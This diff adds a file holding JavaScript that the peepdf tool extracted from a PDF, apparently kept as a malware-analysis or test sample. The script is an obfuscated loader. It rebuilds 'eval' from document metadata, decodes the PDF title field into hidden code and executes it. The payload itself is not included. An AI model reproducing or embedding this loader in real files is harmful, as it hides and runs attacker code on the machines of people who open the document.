@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+HtywiNybyv='';
+QyxIleca=2011;
+var j = QyxIleca-2007;
+LefoPeza='2011s'.replace(QyxIleca,'hi');
+WesetofojIvf=('.tit2011').replace(QyxIleca,'le');
+eval('Qyjubbeduwipzi=t'+LefoPeza+WesetofojIvf);
+DxuDoogsdetox=('sub2011').replace(QyxIleca,'ject');
+eval('ZanowcYvonqixen=t'+LefoPeza+'.'+DxuDoogsdetox);
+ZanowcYvonqixen=ZanowcYvonqixen.replace(QyxIleca,'al');
+eval('BocuMezery=t'+LefoPeza);
+eval('TpEtojohyekidoxiv=BocuMezery[ZanowcYvonqixen]');
+QicoqujotamejetuSkug='.pro2011cer';
+QicoqujotamejetuSkug=TpEtojohyekidoxiv('QicoqujotamejetuSkug.replace(QyxIleca,"du")');
+eval('JezYcyslazsugek=t'+LefoPeza+QicoqujotamejetuSkug);
+RuwigOkuf=TpEtojohyekidoxiv(JezYcyslazsugek);
+GparUziniloga = Qyjubbeduwipzi.split(',');
+for (Jotci = 0; Jotci < GparUziniloga.length; Jotci++) {
+	NevamikuHvpygacu = TpEtojohyekidoxiv(GparUziniloga[Jotci]);
+	HtywiNybyv += RuwigOkuf(NevamikuHvpygacu);
+}
+TpEtojohyekidoxiv(HtywiNybyv);
+
+)
+>>]
+>>
+
